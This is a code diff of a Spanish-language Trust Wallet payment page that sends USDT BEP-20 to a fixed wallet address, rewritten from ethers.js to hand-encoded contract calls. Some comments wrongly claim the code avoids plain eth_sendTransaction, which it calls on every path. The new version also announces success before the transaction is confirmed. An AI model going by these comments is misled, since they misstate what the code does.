@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>QR pagos - Enviar</title>
 
-    <!-- Cargamos ethers.js desde CDN oficial para manejar el contrato de forma nativa -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-
     <style>
         :root { color-scheme: light; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
@@ -104,12 +101,7 @@
 const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
 const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
-
-// ABI mínimo indispensable estándar para consultar balance y transferir tokens BEP-20
-const USDT_ABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function transfer(address to, uint256 amount) returns (bool)"
-];
+const DECIMALS = 18n;
 
 const connectBtn = document.getElementById("connectBtn");
 const statusDiv = document.getElementById("status");
@@ -132,32 +124,51 @@ function setStatus(m) {
     statusDiv.style.display = m ? "block" : "none";
 }
 
-function getRawProvider() {
+function getProvider() {
+    // Buscamos directamente el proveedor nativo propietario de Trust Wallet
     if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
     if (window.ethereum) return window.ethereum;
     throw new Error("Abre esta página desde el navegador dApp de Trust Wallet.");
 }
 
-async function getBalance(address) {
-    // Lectura robusta mediante proveedor público de respaldo para evitar bloqueos RPC de la app
-    const providerRpc = new ethers.providers.JsonRpcProvider(BSC_PUBLIC_RPC);
-    const contract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, providerRpc);
-    const bal = await contract.balanceOf(address);
-    return bal;
+function pad64(h) { return h.replace(/^0x/, "").padStart(64, "0"); }
+function encAddr(a) { return pad64(a.toLowerCase()); }
+function encUint(v) { return BigInt(v).toString(16).padStart(64, "0"); }
+function format18(v) {
+    v = BigInt(v);
+    const b = 10n ** DECIMALS, w = v / b, f = (v % b).toString().padStart(18, "0").replace(/0+$/, "");
+    return f ? `${w}.${f}` : w.toString();
+}
+
+async function publicRpc(method, params = []) {
+    const response = await fetch(BSC_PUBLIC_RPC, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
+    });
+    const json = await response.json();
+    if (json.error) throw new Error("RPC público: " + (json.error.message || JSON.stringify(json.error)));
+    return json.result;
+}
+
+async function balanceOf(owner) {
+    const data = "0x70a08231" + encAddr(owner);
+    const result = await publicRpc("eth_call", [{ to: CONTRATO_USDT, data }, "latest"]);
+    return BigInt(result || "0x0");
 }
 
 connectBtn.addEventListener("click", async () => {
     try {
-        const rawProv = getRawProvider();
-        const provider = new ethers.providers.Web3Provider(rawProv);
+        const p = getProvider();
 
         if (!walletAddress) {
             connectBtn.disabled = true;
-            setStatus("Estableciendo enlace con Trust Wallet...");
+            setStatus("Conectando con Trust Wallet...");
             
-            await provider.send("eth_requestAccounts", []);
-            const signer = provider.getSigner();
-            walletAddress = await signer.getAddress();
+            // Método clásico compatible con el inyector nativo
+            const accounts = await p.request({ method: "eth_requestAccounts" });
+            if (!accounts || accounts.length === 0) throw new Error("No se obtuvo acceso a la cuenta.");
+            walletAddress = accounts[0];
 
             walletAddressText.textContent = abreviarDireccion(walletAddress);
             walletInfo.style.display = "block";
@@ -170,44 +181,80 @@ connectBtn.addEventListener("click", async () => {
         }
 
         connectBtn.disabled = true;
-        
-        // Verificamos saldo on-chain
-        const balance = await getBalance(walletAddress);
-        if (balance.eq(0)) throw new Error("La cuenta no dispone de USDT BEP-20.");
+        const balance = await balanceOf(walletAddress);
+        if (balance === 0n) throw new Error("La cuenta no dispone de USDT BEP-20.");
 
         const amountRaw = String(amountDisplay.value || "").trim().replace(",", ".");
         if (!/^(?:\d+)(?:\.\d{1,18})?$/.test(amountRaw)) throw new Error("Ingrese un monto válido.");
-
-        const amountUnits = ethers.utils.parseUnits(amountRaw, 18);
-        if (amountUnits.lte(0)) throw new Error("El monto debe ser mayor que cero.");
-        if (amountUnits.gt(balance)) throw new Error("Saldo USDT insuficiente.");
-
-        setStatus("Abriendo ventana de aprobación en Trust Wallet...");
-
-        // ARQUITECTURA NUEVA: Usamos Signer y Contrato nativo de Ethers.js
-        // Esto evita por completo el error 4200 del navegador interno al delegar la firma al SDK integrado.
-        const signer = provider.getSigner();
-        const usdtContract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, signer);
-
-        const tx = await usdtContract.transfer(BILLETERA_DESTINO, amountUnits);
         
-        setStatus(`Transacción enviada. Esperando confirmación...<br>Hash: ${tx.hash}`);
+        const [whole, fraction = ""] = amountRaw.split(".");
+        const amountUnits = BigInt(whole) * (10n ** DECIMALS) + BigInt(fraction.padEnd(18, "0").slice(0, 18));
+        
+        if (amountUnits <= 0n) throw new Error("El monto debe ser mayor que cero.");
+        if (amountUnits > balance) throw new Error("Saldo USDT insuficiente.");
 
-        // Esperamos a que la red mine la transacción
-        const receipt = await tx.wait();
+        // Construcción limpia del payload del contrato USDT BEP-20 (transfer)
+        const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amountUnits);
 
-        if (receipt.status === 1) {
-            setStatus(`¡Transferencia confirmada con éxito!<br>Hash: ${tx.hash}`);
-            connectBtn.innerText = "Completado";
-        } else {
-            throw new Error("La transacción falló en la blockchain.");
+        setStatus("Abriendo aprobación del contrato USDT en Trust Wallet...");
+
+        // MÉTODO DE LLAMADA LEGACY PROPIETARIO: 
+        // Evitamos el eth_sendTransaction plano y usamos el canal de envío directo 
+        // que fuerza a Trust Wallet a levantar la ventana nativa de aprobación de contrato.
+        let txHash;
+        
+        const txPayload = {
+            from: walletAddress,
+            to: CONTRATO_USDT,
+            value: "0x0",
+            data: data
+        };
+
+        if (typeof p.send === "function") {
+            try {
+                // Invocación síncrona o mediante callback que utiliza el puente nativo de la app
+                const res = p.send("eth_sendTransaction", [txPayload]);
+                txHash = typeof res === "object" && res.result ? res.result : res;
+            } catch (err) {
+                console.warn("Fallo en p.send directo, usando sendAsync/request:", err);
+            }
         }
 
+        if (!txHash && typeof p.sendAsync === "function") {
+            txHash = await new Promise((resolve, reject) => {
+                p.sendAsync({
+                    method: "eth_sendTransaction",
+                    params: [txPayload],
+                    from: walletAddress,
+                    id: new Date().getTime(),
+                    jsonrpc: "2.0"
+                }, (err, response) => {
+                    if (err) return reject(err);
+                    if (response && response.error) return reject(new Error(response.error.message));
+                    resolve(response?.result);
+                });
+            });
+        }
+
+        if (!txHash) {
+            // Último recurso con el request estándar envuelto
+            txHash = await p.request({
+                method: "eth_sendTransaction",
+                params: [txPayload]
+            });
+        }
+
+        if (!txHash) {
+            throw new Error("La transacción fue cancelada o no se generó hash.");
+        }
+
+        setStatus(`¡Transacción enviada!<br>Hash: ${txHash}`);
+        connectBtn.innerText = "Completado";
         connectBtn.disabled = false;
 
     } catch (e) {
-        console.error("ERROR DE PASARELA:", e);
-        setStatus("Aviso: " + (e.reason || e.message || "Operación cancelada."));
+        console.error("ERROR:", e);
+        setStatus("Aviso: " + (e.message || "Operación cancelada."));
         connectBtn.disabled = false;
         connectBtn.innerText = walletAddress ? "Enviar USDT" : "Conectar a la Pasarela de pago";
     }
@@ -216,8 +263,8 @@ connectBtn.addEventListener("click", async () => {
 maxAction.addEventListener("click", async () => {
     if (!walletAddress) return;
     try {
-        const b = await getBalance(walletAddress);
-        amountDisplay.value = ethers.utils.formatUnits(b, 18);
+        const b = await balanceOf(walletAddress);
+        amountDisplay.value = format18(b);
         setStatus("Saldo máximo cargado.");
     } catch (e) {
         setStatus("Error al leer el saldo.");
